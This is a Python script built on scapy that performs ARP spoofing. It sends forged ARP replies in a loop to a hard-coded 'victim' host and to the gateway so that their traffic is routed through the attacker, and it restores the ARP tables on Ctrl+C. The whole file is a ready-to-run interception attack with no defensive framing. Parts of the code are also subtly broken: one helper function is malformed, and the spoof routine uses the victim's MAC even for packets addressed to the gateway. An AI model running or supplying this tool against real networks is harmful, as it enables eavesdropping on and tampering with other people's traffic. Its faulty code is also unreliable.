from scapy.all import ARP, Ether, send
import time
import sys
import signal

# ---------- CONFIGURATION ----------
target_ip = "192.168.1.10"    # Victim's IP
gateway_ip = "192.168.1.1"    # Router's IP
interface = "eth0"            # Network interface (e.g., eth0, wlan0)
# ----------------------------------

def get_mac(ip):
    """Get MAC address for a given IP on local LAN."""
    ans, _ = ARP(pdst=ip), timeout=2, verbose=False
    return ans[0].hwsrc if ans else None

def spoof(target_ip, spoof_ip):
    """Send a fake ARP reply to target, associating spoof_ip with attacker's MAC."""
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_response, iface=interface, verbose=False)

def restore(dst_ip, src_ip, dst_mac, src_mac):
    """Send correct ARP response to fix the table after attack."""
    packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    send(packet, count=4, iface=interface, verbose=False)

# Capture Ctrl+C to stop attack and restore
def signal_handler(sig, frame):
    print("\n[!] Detected CTRL+C! Restoring ARP tables...")
    restore(target_ip, gateway_ip, target_mac, gateway_mac)
    restore(gateway_ip, target_ip, gateway_mac, target_mac)
    print("[+] ARP tables restored. Exiting.")
    sys.exit(0)

if __name__ == "__main__":
    try:
        print("[*] Starting ARP spoofing attack...")

        # Get MAC addresses
        from scapy.all import srp
        def resolve_mac(ip):
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            ans, _ = srp(pkt, timeout=2, verbose=False)
            return ans[0][1].hwsrc if ans else None

        target_mac = resolve_mac(target_ip)
        gateway_mac = resolve_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            print("[-] Could not resolve MAC addresses. Are devices up?")
            sys.exit(1)

        signal.signal(signal.SIGINT, signal_handler)

        while True:
            spoof(target_ip, gateway_ip)     # Spoof victim
            spoof(gateway_ip, target_ip)     # Spoof gateway
            time.sleep(2)

    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)